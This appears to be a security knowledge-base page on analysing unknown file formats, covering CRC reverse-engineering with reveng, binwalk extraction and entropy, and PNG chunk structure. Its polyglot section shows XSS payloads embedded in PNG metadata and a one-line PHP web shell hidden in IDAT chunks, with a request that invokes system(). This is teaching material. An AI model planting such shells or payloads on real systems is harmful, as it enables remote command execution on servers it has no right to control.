---
description: What to do with a file you don't understand
---

# File Formats

## Understanding common file formats

If you want to understand how a file format works, you should look at documentation online about it. Often these formats are not ASCII readable so you'll want to use a hex editor, such as `xxd`, `hexedit` or [hexyl](https://github.com/sharkdp/hexyl).&#x20;

A big collection of file formats made by Ange Albertini is the following (just scroll through until you find your format):

{% embed url="https://github.com/corkami/pics/blob/master/binary/README.md" %}
A big collection of drawings of file formats to understand them quickly
{% endembed %}

### CRCs: Cyclic Redundancy Checks

File formats often use a [Cyclic Redundancy Check (CRC)](https://en.wikipedia.org/wiki/Cyclic_redundancy_check) to validate if the bytes have been tampered with or corrupted slightly. See these as a checksum that combines all bytes into a small extra set of bytes that is different if you change even a single bit. These are not as strong as real hashing algorithms, but only output a few bytes. Preventing collisions is not their purpose, purely detecting accidental changes.

Because there are many different types of CRCs, a site like the following makes it easy to compare your data and output to reverse engineer exactly what algorithm was used. Then you can use this knowledge to create a correct checksum for any arbitrary data:

{% embed url="https://crccalc.com/" %}
Quickly view lots of well-known CRC of different sizes based on your input
{% endembed %}

[CRC `reveng`](https://reveng.sourceforge.io/) is another tool built for calculating the CRC parameters from enough samples, so it does not have to be a well-known algorithm.&#x20;

<details>

<summary>Compilation</summary>

Download and extract the source code, then run `make`. If you run into the following error, do as it says and change the `BMP_BIT` and `BMP_SUB` values inside `config.h`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ make
</strong>gcc -O3 -Wall -ansi -fomit-frame-pointer -DPRESETS -DBMPTST -o bmptst bmpbit.c
( ./bmptst &#x26;&#x26; touch bmptst ) || ( rm bmptst bmptst.exe &#x26;&#x26; false )
reveng: configuration fault.  Update config.h with these definitions and recompile:
        #define BMP_BIT   64
        #define BMP_SUB   32
<strong>$ make
</strong>gcc -O3 -Wall -ansi -fomit-frame-pointer -DPRESETS -DBMPTST -o bmptst bmpbit.c
( ./bmptst &#x26;&#x26; touch bmptst ) || ( rm bmptst bmptst.exe &#x26;&#x26; false )
gcc -O3 -Wall -ansi -fomit-frame-pointer -DPRESETS -c bmpbit.c
gcc -O3 -Wall -ansi -fomit-frame-pointer -DPRESETS -c cli.c
gcc -O3 -Wall -ansi -fomit-frame-pointer -DPRESETS -c model.c
gcc -O3 -Wall -ansi -fomit-frame-pointer -DPRESETS -c poly.c
gcc -O3 -Wall -ansi -fomit-frame-pointer -DPRESETS -c preset.c
gcc -O3 -Wall -ansi -fomit-frame-pointer -DPRESETS -c reveng.c
...
</code></pre>

Then you can install the tool using `sudo ln -s "$(pwd)"/reveng /usr/bin/reveng`.

</details>

<details>

<summary>Usage</summary>

Given a word length (often 8, 16 or 32), this tool can find the parameters of a CRC algorithmically. You need to provide hex strings that are followed by the CRC. Often these can be recognized by templated data (eg. lots of nulls or similar data) followed by 1, 2 or 4 random bytes which are the CRC. Take the following example:

{% code title="Hexdump" %}
```python
52 45 43 00  02 00 00 00  04 00 00 00  05 00 00 00  D9 D1 49 38  REC...............I8
52 45 43 00  02 00 00 00  06 00 00 00  07 00 00 00  2F 1E 65 D0  REC............./.e.
52 45 43 00  02 00 00 00  08 00 00 00  09 00 00 00  2E 7B 30 25  REC..............{0%
52 45 43 00  02 00 00 00  0A 00 00 00  0B 00 00 00  D8 B4 1C CD  REC.................
```
{% endcode %}

It looks like the last 4 bytes of each row are pretty random. To crack the exact algorithm used, we simply provide them to `reveng` as hex strings and the 32-bit length we guessed52 45 43 00  02 00 00 00  04 00 00 00  05 00 00 00  D9 D1 49 38  REC...............I8

<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ reveng -w32 -s \
</strong><strong>  "52 45 43 00  02 00 00 00  04 00 00 00  05 00 00 00  D9 D1 49 38" \
</strong><strong>  "52 45 43 00  02 00 00 00  06 00 00 00  07 00 00 00  2F 1E 65 D0" \
</strong><strong>  "52 45 43 00  02 00 00 00  08 00 00 00  09 00 00 00  2E 7B 30 25" \
</strong><strong>  "52 45 43 00  02 00 00 00  0A 00 00 00  0B 00 00 00  D8 B4 1C CD"
</strong>
width=32  poly=0x04c11db7  init=0xffffffff  refin=true  refout=true  xorout=0xffffffff  check=0xcbf43926  residue=0xdebb20e3  name="CRC-32/ISO-HDLC"
</code></pre>

It found all parameters, and the preset name "CRC-32/ISO-HDLC". This is a well-known variant. Next, we can predict the CRC for any sequence of data by specifying a preset:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ reveng -m "CRC-32/ISO-HDLC" -c \
</strong><strong>  "52 45 43 00  02 00 00 00  04 00 00 00  05 00 00 00"
</strong>
d9d14938
</code></pre>

This correctly computes the hash for the first string! If the tool did not find a named preset, you can still give it the raw parameters to achieve the same result:

<pre class="language-shell-session"><code class="lang-shell-session">$ reveng -w $WIDTH -p $POLY -i $INIT -x $XOROUT -c $INPUT_DATA
# # See -b, -B, -l, and -L for refin/refout values
<strong>$ reveng -w32 -p 0x04C11DB7 -i 0xFFFFFFFF -l -x 0xFFFFFFFF -c \
</strong><strong>  "52 45 43 00  02 00 00 00  04 00 00 00  05 00 00 00"
</strong>
d9d14938
</code></pre>

</details>

## Binwalk

Sometimes when data tries to be hidden inside another file, it is just pasted right into the host file. Meaning that the bytes of the secret file are just somewhere in the other file. Using [binwalk](https://github.com/ReFirmLabs/binwalk) you can check for known file signatures in a file to see if it embeds something. \
Using the following command you can also recursively extract all of these into a `.extracted` folder:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ binwalk -eM file.bin
</strong>DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             TRX firmware header, little endian, image size: 37883904 bytes, CRC32: 0x95C5DF32, flags: 0x1, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x0, rootfs offset: 0x0
28            0x1C            uImage header, header size: 64 bytes, header CRC: 0x780C2742, created: 2018-10-10 02:12:20, image size: 2150281 bytes, Data Address: 0x8000, Entry Point: 0x8000, data CRC: 0xA097CFEA, OS: Linux, CPU: ARM, image type: OS Kernel Image, compression type: none, image name: "DD-WRT"
92            0x5C            Linux kernel ARM boot executable zImage (little-endian)
2460          0x99C           device tree image (dtb)
23432         0x5B88          xz compressed data
23776         0x5CE0          xz compressed data
2117484       0x204F6C        device tree image (dtb)
3145756       0x30001C        UBI erase count header, version: 1, EC: 0x0, VID header offset: 0x800, data offset: 0x1000

<strong>$ binwalk --dd='.*' file.bin  # Another way to extract all file signatures
</strong></code></pre>

{% hint style="warning" %}
A common false positive with PNGs is `Zlib compressed data`. This is because PNG uses Zlib for compression in its own file format, so it is recognized by binwalk. But very often this compressed data just covers the entire file
{% endhint %}

You can also use binwalk to understand an unknown file better, by looking at the **entropy** for example. Entropy is how random a certain sequence of bytes is. Simple ASCII text is pretty predictable and stays within about the same range, so the entropy would be low. But for completely random/encrypted bytes the entropy should be really high, close to 1. You can get a graph of the entropy of the file using the `-E` flag:

```shell-session
$ binwalk -E file.bin
```

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption><p>An example of a firmware image showing various amounts of entropy (<a href="https://allabouttesting.org/short-tutorial-firmware-analysis-tool-binwalk/">source</a>)</p></figcaption></figure>

This can give a good idea about what parts of a file you could look at.&#x20;

## PNG

Image files like PNG can have a lot of hidden info. It's a relatively complex file format with a lot of room for secrets.&#x20;

A quick check you can do to see if it is a completely valid PNG file is using [pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html):

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ pngcheck -h
</strong>Test PNG, JNG or MNG image files for corruption, and print size/type info.

Usage:  pngcheck [-7cfpqtv] file.{png|jng|mng} [file2.{png|jng|mng} [...]]
   or:  ... | pngcheck [-7cfpqstvx]
   or:  pngcheck [-7cfpqstvx] file-containing-PNGs...

Options:
   -7  print contents of tEXt chunks, escape chars >=128 (for 7-bit terminals)
   -c  colorize output (for ANSI terminals)
   -f  force continuation even after major errors
   -p  print contents of PLTE, tRNS, hIST, sPLT and PPLT (can be used with -q)
   -q  test quietly (output only errors)
   -s  search for PNGs within another file
   -t  print contents of tEXt chunks (can be used with -q)
   -v  test verbosely (print most chunk data)
   -x  search for PNGs within another file and extract them when found

<strong>$ pngcheck image.png
</strong>OK: image.png (1920x1080, 32-bit RGB+alpha, non-interlaced, 96.6%).
</code></pre>

PNG files consist of **chunks** of bytes that tell something about the image. The most common one is `IDAT` which contains the pixel data of the image. An image always ends with `IEND` and 4 checksum bytes (every chunk has the checksum).&#x20;

You might see custom chunks being used to embed data, or data appended to the end, after `IEND`.&#x20;

### Embed Raw Data (Polyglots)

You might find some applications where you are allowed to upload files and find that you can either give them a `.php` extension to create a web shell or make the `Content-Type: text/html` to render tags inside the raw bytes for [cross-site-scripting-xss](../web/client-side/cross-site-scripting-xss/ "mention"). In either case, this application might validate or even transform your image in a way that does not preserve all the original bytes, breaking your payload.&#x20;

While you might be able to include **metadata** with tools like `exiftool`, these might be stripped by the server upon saving your file:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ exiftool -Comment='&#x3C;svg/onload=alert()>' example.png
</strong>    1 image files updated
<strong>$ hd example.png
</strong>00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
...
00000080  e0 b6 b6 f4 d1 0d 53 22  0d 14 00 00 00 1c 74 45  |......S"......tE|
<strong>00000090  58 74 43 6f 6d 6d 65 6e  74 00 3c 73 76 67 2f 6f  |XtComment.&#x3C;svg/o|
</strong><strong>000000a0  6e 6c 6f 61 64 3d 61 6c  65 72 74 28 29 3e ad 30  |nload=alert()>.0|
</strong>000000b0  14 57 00 00 08 7d 49 44  41 54 78 5e ec ce 31 0d  |.W...}IDATx^..1.|
</code></pre>

Another trick is simply appending data to the end of the file. This would not pass as a valid PNG anymore, but could survive on the server:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ echo '&#x3C;svg/onload=alert()>' >> example.png
</strong>
<strong>$ hd example.png
</strong>...
000009d0  5a b3 07 54 ac 7b 51 fb  78 a7 ea 00 00 00 00 49  |Z..T.{Q.x......I|
<strong>000009e0  45 4e 44 ae 42 60 82 3c  73 76 67 2f 6f 6e 6c 6f  |END.B`.&#x3C;svg/onlo|
</strong><strong>000009f0  61 64 3d 61 6c 65 72 74  28 29 3e 0a              |ad=alert()>.|
</strong>000009fc
</code></pre>

Lastly, there is a technique more resistant to transformation by using the **IDAT chunks**. These normally include compressed DEFLATE data representing the pixels themselves, but this process can be reversed to obtain a string of pixels that compress into a payload like:

```php
<?=$_GET[0]($_POST[1]);?>
```

If the payload above is executed, you can provide a function you want to call like `system()` as the query parameter `0`, and an argument you want to give the function in a `1` body parameter.&#x20;

<pre class="language-http"><code class="lang-http"><strong>POST /shell.php?0=system HTTP/1.1
</strong>...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

<strong>1=id
</strong></code></pre>

The process of creating these and a few example payloads are described in the following post, which also shows an XSS payload with the same idea:

{% embed url="https://web.archive.org/web/20250713054441/https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" %}

## Archives (ZIP, TAR, 7z, etc.)

{% content-ref url="archives.md" %}
[archives.md](archives.md)
{% endcontent-ref %}
